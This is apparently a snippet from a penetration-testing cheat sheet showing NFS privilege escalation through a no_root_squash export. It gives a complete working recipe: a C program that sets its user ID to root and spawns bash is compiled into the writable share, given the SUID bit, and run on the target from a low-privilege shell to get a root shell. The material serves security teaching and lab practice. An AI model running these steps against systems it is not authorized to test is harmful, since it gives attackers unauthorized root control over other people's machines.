<Accordion title="Privilege escalation via no_root_squash">

### Privilege escalation via no_root_squash

**NFS Enumeration and Exports**

```bash
# On YOUR box (as root), inside the writable mounted share:
cat > /tmp/nfs/shell.c <<'EOF'
int main(void){ setuid(0); setgid(0); system("/bin/bash"); return 0; }
EOF
gcc /tmp/nfs/shell.c -o /tmp/nfs/rootshell      # compiles into the share as root
chmod u+s /tmp/nfs/rootshell                     # set the SUID bit (stays because no_root_squash)

# On the TARGET (via a low-priv shell on the box), in the same directory:
./rootshell                                      # runs as root → root shell
```
